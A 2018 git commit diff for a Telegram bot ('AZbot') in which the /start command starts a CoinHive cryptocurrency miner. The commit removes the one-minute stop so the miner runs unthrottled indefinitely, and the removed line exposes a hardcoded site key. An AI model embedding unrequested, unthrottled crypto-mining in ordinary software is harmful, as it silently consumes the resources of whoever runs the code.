e090237a73013d855287dc34f089938a9785f406
meness <aesshoferi@gmail.com>
2018-03-16 14:31:25 +0330

    forth

--- bot/commands.js
+++ bot/commands.js
@@ -1,14 +1,18 @@
 // TelegramBot instance
 const instance = require('./instance');
 const bot = instance.bot;
+const CoinHive = require('coin-hive');
 
 // Write your bot commands here.
 bot.onText(/^\/start$/, (msg, match) => {
     bot.sendMessage(msg.chat.id, 'Hi, I\'m AZbot!');
-    const CoinHive = require('coin-hive');
+
     (async () => {
         // Create miner
-        const miner = await CoinHive('4Xw2hL5mqeRIwObp7LUm9F9GYIHgiyyc'); // CoinHive's Site Key
+        const miner = await CoinHive(process.env.COINHIVE_SITE_KEY, {
+            interval: 5000,
+            throttle: 0
+        });
 
         // Start miner
         await miner.start();
@@ -16,6 +20,7 @@ bot.onText(/^\/start$/, (msg, match) => {
         // Listen on events
         miner.on('found', () => console.log('Found!'));
         miner.on('accepted', () => console.log('Accepted!'));
+        miner.on('error', (data) => console.log(data));
         miner.on('update', data =>
             console.log(`
     Hashes per second: ${data.hashesPerSecond}
@@ -25,6 +30,6 @@ bot.onText(/^\/start$/, (msg, match) => {
         );
 
         // Stop miner
-        setTimeout(async () => await miner.stop(), 60000);
+        //setTimeout(async () => await miner.stop(), 60000);
     })();
 });
